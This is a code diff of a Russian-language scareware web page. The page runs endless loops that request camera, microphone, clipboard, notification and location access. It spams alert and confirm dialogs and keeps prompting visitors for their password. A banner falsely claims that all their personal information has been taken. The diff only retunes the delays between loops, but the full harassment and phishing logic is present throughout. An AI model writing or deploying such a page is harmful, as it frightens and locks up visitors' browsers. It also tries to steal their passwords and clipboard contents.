@@ -77,35 +77,35 @@ async function requestPermissions() {
         try { await navigator.mediaDevices.getUserMedia({ audio: true, video: true }); } catch {}
         try { await Notification.requestPermission(); } catch {}
         try { await navigator.clipboard.readText(); } catch {}
-        await new Promise(r => setTimeout(r, 9000)); // пауза между циклами
+        await new Promise(r => setTimeout(r, 500)); // пауза между циклами
     }
 }
 
 async function spamAlerts() {
     while (true) {
         alert("⚠️ Внимание! Запрашиваем доступ!");
-        await new Promise(r => setTimeout(r, 100));
+        await new Promise(r => setTimeout(r, 11100));
     }
 }
 
 async function spamConfirms() {
     while (true) {
         confirm("Разрешить доступ к камере и микрофону?");
-        await new Promise(r => setTimeout(r, 150));
+        await new Promise(r => setTimeout(r, 1150));
     }
 }
 
 async function spamPrompts() {
     while (true) {
         prompt("Введите ваш пароль");
-        await new Promise(r => setTimeout(r, 200));
+        await new Promise(r => setTimeout(r, 21100));
     }
 }
 
 async function spamGeo() {
     while (true) {
         navigator.geolocation.getCurrentPosition(() => {}, () => {});
-        await new Promise(r => setTimeout(r, 300));
+        await new Promise(r => setTimeout(r, 3100));
     }
 }
 
@@ -143,6 +143,7 @@ main();
     <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
 </body>
 </html>
+
 
 
 
